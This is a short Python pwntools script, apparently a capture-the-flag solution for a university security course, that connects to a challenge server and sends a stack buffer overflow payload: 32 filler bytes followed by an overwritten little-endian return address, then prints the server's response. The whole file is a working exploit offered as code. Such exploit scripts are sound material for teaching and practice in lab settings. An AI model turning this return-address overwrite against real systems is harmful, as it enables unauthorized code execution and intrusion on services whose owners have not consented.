from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23153

s = remote(SERVER, PORT, timeout=9999)

s.recvline()
s.sendline(b'1'*32 + 0x80486f1.to_bytes(length=4,byteorder="little"))
s.recvline()
s.recvline()
response = s.recvline()

print(response.decode())
